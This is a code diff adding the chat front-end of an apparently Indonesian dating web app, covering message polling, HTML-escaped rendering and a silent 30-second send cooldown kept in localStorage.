+    document.getElementById('view-chat').classList.add('hidden');
+    if (chatPollingTimer) clearInterval(chatPollingTimer);
+    activeChatMatch = null;
+  }
+
+  async function fetchChatMessages() {
+    if (!activeChatMatch) return;
+    try {
+      const res = await fetch(`${API_URL}?action=getMessages&matchId=${encodeURIComponent(activeChatMatch.matchId)}`);
+      const data = await res.json();
+      if (data.status === 'success') {
+        renderChatMessages(data.messages);
+      }
+    } catch (e) {
+      // Abaikan error polling sementara
+    }
+  }
+
+  function renderChatMessages(messages) {
+    const box = document.getElementById('chat-messages');
+    const isAtBottom = box.scrollHeight - box.scrollTop <= box.clientHeight + 80;
+
+    if (messages.length === 0) {
+      box.innerHTML = `<div class="text-center text-xs text-slate-400 my-8">Kalian sudah match! Sapa duluan sekarang.</div>`;
+      return;
+    }
+
+    box.innerHTML = messages.map(m => {
+      const isMe = m.senderId === currentUser.id;
+      const timeStr = new Date(m.timestamp).toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
+      return `
+        <div class="flex flex-col ${isMe ? 'items-end' : 'items-start'}">
+          <div class="max-w-[78%] px-4 py-2.5 rounded-2xl text-sm ${isMe ? 'bg-rose-600 text-white rounded-br-sm' : 'bg-white text-slate-800 border border-slate-200/80 rounded-bl-sm'}">
+            ${escapeHtml(m.message)}
+          </div>
+          <span class="text-[10px] text-slate-400 mt-1 px-1">${timeStr}</span>
+        </div>
+      `;
+    }).join('');
+
+    if (isAtBottom) {
+      box.scrollTop = box.scrollHeight;
+    }
+  }
+
+  // =========================================================================
+  // 7. COOLDOWN 30 DETIK DIAM-DIAM (TANPA POP-UP MARAH-MARAH)
+  // =========================================================================
+  function getCooldownKey() {
+    return `temurasa_cd_${currentUser.id}_${activeChatMatch ? activeChatMatch.matchId : ''}`;
+  }
+
+  function startSilentCooldown(seconds = 30) {
+    const unlockAt = Date.now() + (seconds * 1000);
+    localStorage.setItem(getCooldownKey(), unlockAt.toString());
+    syncCooldownButtonState();
+  }
+
+  function syncCooldownButtonState() {
+    if (cooldownTimer) clearInterval(cooldownTimer);
+    const btn = document.getElementById('btn-send-chat');
+
+    const updateBtn = () => {
+      const unlockAt = parseInt(localStorage.getItem(getCooldownKey()) || '0', 10);
+      const remaining = Math.ceil((unlockAt - Date.now()) / 1000);
+
+      if (remaining > 0) {
+        btn.disabled = true;
+        btn.textContent = `Kirim (${remaining}s)`;
+      } else {
+        btn.disabled = false;
+        btn.textContent = 'Kirim';
+        clearInterval(cooldownTimer);
+      }
+    };
+
+    updateBtn();
+    cooldownTimer = setInterval(updateBtn, 1000);
+  }
+
+  document.getElementById('chat-form').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    if (!activeChatMatch) return;
+
+    const btn = document.getElementById('btn-send-chat');
+    if (btn.disabled) return;
+
+    const input = document.getElementById('chat-input');
+    const text = input.value.trim();
+    if (!text) return;
+
+    input.value = '';
+    startSilentCooldown(30); // Langsung aktifkan cooldown 30 detik secara diam-diam
+
+    try {
+      const res = await fetch(API_URL, {
+        method: 'POST',
+        body: JSON.stringify({
+          action: 'sendMessage',
+          matchId: activeChatMatch.matchId,
+          senderId: currentUser.id,
+          message: text
+        })
+      });
+      const data = await res.json();
+      if (data.status === 'cooldown') {
+        startSilentCooldown(data.remainingSeconds);
+      } else if (data.status === 'success') {
+        fetchChatMessages();
+      }
+    } catch (err) {
+      console.error('Gagal kirim pesan:', err);
+    }
+  });
+
+  function escapeHtml(str) {
+    return String(str)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;');
+  }
+</script>
 
 </body>
 </html>
